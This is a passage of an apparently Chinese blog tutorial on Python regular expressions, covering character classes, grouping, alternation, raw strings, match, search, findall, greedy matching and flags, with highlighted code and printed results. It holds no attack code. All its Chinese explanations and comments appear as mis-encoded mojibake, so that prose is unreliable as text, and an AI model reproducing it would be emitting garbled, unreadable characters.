class="comment">#\SåŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^\t\n\r\f\v](æ¨ªå‘åˆ¶è¡¨ç¬¦ã€æ¢è¡Œã€å›è½¦ã€æ¢é¡µã€çºµå‘åˆ¶è¡¨ç¬¦)</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'è¿™'</span>, <span class="string">'2'</span>, <span class="string">'ä¸ª'</span>, <span class="string">'å­—'</span>, <span class="string">'ç¬¦'</span>, <span class="string">'ä¸²'</span>, <span class="string">'3'</span>, <span class="string">'æ˜¯'</span>, <span class="string">'å¦'</span>, <span class="string">'åŒ¹'</span>, <span class="string">'é…'</span>, <span class="string">'è§„'</span>, <span class="string">'åˆ™'</span>, <span class="string">'5'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'åˆ™'</span>, <span class="string">'7'</span>, <span class="string">'åˆ™'</span>]</span><br></pre></td></tr></table></figure><p>\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\w'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\wåŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">'h'</span>, <span class="string">'t'</span>, <span class="string">'t'</span>, <span class="string">'p'</span>, <span class="string">'s'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'w'</span>, <span class="string">'c'</span>, <span class="string">'n'</span>, <span class="string">'b'</span>, <span class="string">'l'</span>, <span class="string">'o'</span>, <span class="string">'g'</span>, <span class="string">'s'</span>, <span class="string">'c'</span>, <span class="string">'o'</span>, <span class="string">'m'</span>]</span><br></pre></td></tr></table></figure><p>\WåŒ¹é…éä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ï¼Œå®ƒç›¸å½“äºç±»[^a-zA-Z0-9_]</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">'\W'</span>,<span class="string">"https://www.cnblogs.com/"</span>)  <span class="comment">#\Wä¸åŒ¹é…åŒ…æ‹¬ä¸‹åˆ’çº¿åœ¨å†…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼Œå®ƒç›¸å½“äºç±»[^a-zA-Z0-9_]</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#ä»¥åˆ—è¡¨å½¢å¼è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">[<span class="string">':'</span>, <span class="string">'/'</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'.'</span>, <span class="string">'/'</span>]</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œåˆ†ç»„"><a href="#å…ƒå­—ç¬¦ï¼Œåˆ†ç»„" class="headerlink" title="()å…ƒå­—ç¬¦ï¼Œåˆ†ç»„"></a>()å…ƒå­—ç¬¦ï¼Œåˆ†ç»„</h4><p>ä¹Ÿå°±æ˜¯åˆ†ç»„åŒ¹é…ï¼Œ()é‡Œé¢çš„ä¸ºä¸€ä¸ªç»„ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ªæ•´ä½“</p><p>å¦‚æœ()åé¢è·Ÿçš„æ˜¯ç‰¹æ®Šå…ƒå­—ç¬¦å¦‚   (adc)*   é‚£ä¹ˆ*æ§åˆ¶çš„å‰å¯¼å­—ç¬¦å°±æ˜¯()é‡Œçš„æ•´ä½“å†…å®¹ï¼Œä¸å†æ˜¯å‰å¯¼ä¸€ä¸ªå­—ç¬¦</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="comment">#ä¹Ÿå°±æ˜¯åˆ†ç»„åŒ¹é…ï¼Œ()é‡Œé¢çš„ä¸ºä¸€ä¸ªç»„ä¹Ÿå¯ä»¥ç†è§£æˆä¸€ä¸ªæ•´ä½“</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"(a4)+"</span>, <span class="string">"a4a4a4a4a4dg4g654gb"</span>)   <span class="comment">#åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªa4</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.search(<span class="string">"a(\d+)"</span>,<span class="string">"a45646148a49a4a456048a45gg"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">9</span>), match=<span class="string">'a45646148'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result1 = result.group()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure><h4 id="å…ƒå­—ç¬¦ï¼Œæˆ–"><a href="#å…ƒå­—ç¬¦ï¼Œæˆ–" class="headerlink" title="|å…ƒå­—ç¬¦ï¼Œæˆ–"></a>|å…ƒå­—ç¬¦ï¼Œæˆ–</h4><p>|æˆ–ï¼Œæˆ–å°±æ˜¯å‰åå…¶ä¸­ä¸€ä¸ªç¬¦åˆå°±åŒ¹é…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"ä½ |å¥½"</span>, <span class="string">"a4a4aä½ 4aabc4a4dggå¥½dg4g654g"</span>)   <span class="comment">#|æˆ–ï¼Œæˆ–å°±æ˜¯å‰åå…¶ä¸­ä¸€ä¸ªç¬¦åˆå°±åŒ¹é…</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'ä½ '</span>, <span class="string">'å¥½'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a4a4aä½ |å¥½dg4g654"</span>,<span class="string">"a4a4aä½ 4aabc4a4dggå¥½dg4g654g"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a4a4aä½ '</span>, <span class="string">'å¥½dg4g654'</span>]</span><br></pre></td></tr></table></figure><h4 id="råŸç”Ÿå­—ç¬¦"><a href="#råŸç”Ÿå­—ç¬¦" class="headerlink" title="råŸç”Ÿå­—ç¬¦"></a>råŸç”Ÿå­—ç¬¦</h4><p>å°†åœ¨pythoné‡Œæœ‰ç‰¹æ®Šæ„ä¹‰çš„å­—ç¬¦å¦‚\bï¼Œè½¬æ¢æˆåŸç”Ÿå­—ç¬¦ï¼ˆå°±æ˜¯å»é™¤å®ƒåœ¨pythonçš„ç‰¹æ®Šæ„ä¹‰ï¼‰ï¼Œä¸ç„¶ä¼šç»™æ­£åˆ™è¡¨è¾¾å¼æœ‰å†²çªï¼Œä¸ºäº†é¿å…è¿™ç§å†²çªå¯ä»¥åœ¨è§„åˆ™å‰åŠ åŸå§‹å­—ç¬¦r</p><p>(è¿™é‡Œè¿˜æœ‰ç‚¹é—®é¢˜ï¼Œç»“æœä¸å¤ªæ‡‚ï¼Œä¸ºå•¥ç¬¬ä¸€ä¸ªä¸è¾“å‡º [a\b] )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re   <span class="comment">#ç¬¬ä¸€æ­¥ï¼Œè¦å¼•å…¥reæ¨¡å—</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">r"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = re.findall(<span class="string">"a\b"</span>,<span class="string">"welcoma\b"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">[<span class="string">'a\x08'</span>]</span><br></pre></td></tr></table></figure><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(â€œruleâ€,string)</p><h4 id="1-match-æ–¹æ³•-ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…"><a href="#1-match-æ–¹æ³•-ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…" class="headerlink" title="1. match()æ–¹æ³•, ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…"></a>1. match()æ–¹æ³•, ä»å­—ç¬¦ä¸²å¤´éƒ¨å¼€å§‹åŒ¹é…</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="2-åŒ¹é…ç›®æ ‡"><a href="#2-åŒ¹é…ç›®æ ‡" class="headerlink" title="2. åŒ¹é…ç›®æ ‡"></a>2. åŒ¹é…ç›®æ ‡</h4><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç”¨()æ‹¬èµ·æ¥å¯ä»¥ä½¿ç”¨group()è¾“å‡º, è‹¥æœ‰nä¸ª(), é‚£ä¹ˆå¯ä»¥è¡¨ç¤ºä¸ºgroup(n), è¾“å‡ºç¬¬nä¸ªæ‹¬å·åŒ¹é…çš„å†…å®¹.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#å­—ç¬¦ä¸²é•¿åº¦</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s(\d+)\sis'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.group(<span class="number">1</span>)) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªè¢«()åŒ…è£¹çš„å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">13</span>), match='The <span class="number">123456</span> is'&gt;</span><br><span class="line">The <span class="number">123456</span> is</span><br><span class="line"><span class="number">123456</span></span><br><span class="line">(<span class="number">0</span>, <span class="number">13</span>)</span><br></pre></td></tr></table></figure><h4 id="3-é€šç”¨åŒ¹é…"><a href="#3-é€šç”¨åŒ¹é…" class="headerlink" title="3.é€šç”¨åŒ¹é…"></a>3.é€šç”¨åŒ¹é…</h4><p>. è¡¨ç¤ºåŒ¹é…ä»»æ„å­—ç¬¦, *è¡¨ç¤ºåŒ¹é…å‰é¢å­—ç¬¦æ— é™æ¬¡.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">result = re.match(<span class="string">r'^The.*number.$'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(result.span()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹çš„ä½ç½®ç´¢å¼•</span></span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(<span class="number">0</span>, <span class="number">34</span>), match='The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.'&gt;</span><br><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br><span class="line">(<span class="number">0</span>, <span class="number">34</span>)</span><br></pre></td></tr></table></figure><h4 id="4-è´ªå©ªä¸éè´ªå©ª"><a href="#4-è´ªå©ªä¸éè´ªå©ª" class="headerlink" title="4.è´ªå©ªä¸éè´ªå©ª"></a>4.è´ªå©ªä¸éè´ªå©ª</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(<span class="string">'è´ªå©ªåŒ¹é…:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*(\d+).*'</span>, content) <span class="comment">#ä½¿ç”¨matchåŒ¹é…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ­£åˆ™è¡¨è¾¾å¼, ç¬¬äºŒä¸ªä¸ºè¦åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">print(result.group()) <span class="comment">#è¾“å‡ºåŒ¹é…å†…å®¹</span></span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>)) <span class="comment">#è¾“å‡ºç¬¬ä¸€ä¸ªè¢«()åŒ…è£¹çš„å†…å®¹</span></span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'éè´ªå©ªåŒ¹é…:'</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*'</span>, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(<span class="string">'result = %s'</span>%result.group(<span class="number">1</span>))</span><br><span class="line">print(<span class="string">'-'</span>*<span class="number">20</span>)</span><br><span class="line">result = re.match(<span class="string">r'^The.*?(\d+).*?'</span>, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">è´ªå©ªåŒ¹é…:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">éè´ªå©ªåŒ¹é…:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure><h4 id="5-ä¿®é¥°ç¬¦-re-S"><a href="#5-ä¿®é¥°ç¬¦-re-S" class="headerlink" title="5.ä¿®é¥°ç¬¦ re.S"></a>5.ä¿®é¥°ç¬¦ re.S</h4><p>ç”±äºåŠ ä¸Šre.Så‚æ•°å, é€šé…ç¬¦ . å°†å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦, æ‰€ä»¥resultä¸ä¸ºç©º, result2ä¸ºç©ºã€‚é™¤äº†re.S, è¿˜æœ‰è®¸å¤šä¿®é¥°ç¬¦å¦‚, </p><p>re.I: ä½¿ç”¨åŒ¹é…æ—¶å¿½ç•¥å¤§å°å†™ã€‚ï¼ˆå¤§å†™çš„iï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'''The 123456 is</span></span><br><span class="line"><span class="string">one of my phone.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">result = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content, re.S)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    print(result.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result = None'</span>)</span><br><span class="line">result2 = re.match(<span class="string">'^The.*?(\d+).*?phone.'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure><h4 id="6-è½¬ä¹‰åŒ¹é…"><a href="#6-è½¬ä¹‰åŒ¹é…" class="headerlink" title="6.è½¬ä¹‰åŒ¹é…"></a>6.è½¬ä¹‰åŒ¹é…</h4><p>ç”±äº()å±äºæ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹æ®Šå­—ç¬¦, å› æ­¤åœ¨éœ€è¦åŒ¹é…()æ—¶, éœ€è¦åŠ ä¸Šè½¬ä¹‰å­—ç¬¦â€™â€™.</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'(ç™¾åº¦)www.baidu.com'</span></span><br><span class="line">result = re.<span class="keyword">match</span>(<span class="string">'(ç™¾åº¦)www.baidu.com'</span>, content)</span><br><span class="line">result2 = re.<span class="keyword">match</span>(<span class="string">'\(ç™¾åº¦\)www\.baidu\.com'</span>, content)</span><br><span class="line"><span class="keyword">if</span> result:</span><br><span class="line">    <span class="keyword">print</span>(result.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result = None'</span>)</span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="keyword">print</span>(result2.<span class="keyword">group</span>())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">'result2 = None'</span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(ç™¾åº¦)www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure><h4 id="7-search-æ–¹æ³•-ä¸match-æ–¹æ³•ä¸åŒ-ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…"><a href="#7-search-æ–¹æ³•-ä¸match-æ–¹æ³•ä¸åŒ-ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…" class="headerlink" title="7.search()æ–¹æ³•, ä¸match()æ–¹æ³•ä¸åŒ, ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…"></a>7.search()æ–¹æ³•, ä¸match()æ–¹æ³•ä¸åŒ, ä¸éœ€è¦ä»å¤´éƒ¨å¼€å§‹åŒ¹é…</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span> = <span class="string">'Other The 123456 is my one phone number.'</span></span><br><span class="line">result = re.search(<span class="string">'The.*?(\d+).*?number.'</span>, <span class="attribute">content</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(result.group()</span></span>)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">123456</span> <span class="keyword">is</span> <span class="keyword">my</span> one phone <span class="built_in">number</span>.</span><br></pre></td></tr></table></figure><h4 id="8-findall-æ–¹æ³•"><a href="#8-findall-æ–¹æ³•" class="headerlink" title="8.findall()æ–¹æ³•"></a>8.findall()æ–¹æ³•</h4><p>match()å’Œsearch()éƒ½æ˜¯è¿”å›åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªå†…å®¹å°±ç»“æŸåŒ¹é…, findall()æ˜¯è¿”å›æ‰€æœ‰ç¬¦åˆåŒ¹é…è§„åˆ™çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"songs-list"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>æ­Œå•<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"introduction"</span>&gt;</span>æ­Œå•åˆ—è¡¨<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"list"</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"2"</span>&gt;</span>ä¸€è·¯ä¸Šæœ‰ä½ <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"7"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/2.mp3"</span> <span class="attr">singer</span>=<span class="string">"ä»»è´¤é½"</span>&gt;</span>æ²§æµ·ä¸€å£°ç¬‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"4"</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/3.mp3"</span> <span class="attr">singer</span>=<span class="string">"é½ç§¦"</span>&gt;</span>å¾€äº‹éšé£<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">data-view</span>=<span class="string">"6"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/4.mp3"</span> <span class="attr">singer</span>=<span class="string">"beyond"</span>&gt;</span>å…‰è¾‰å²æœˆ<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span 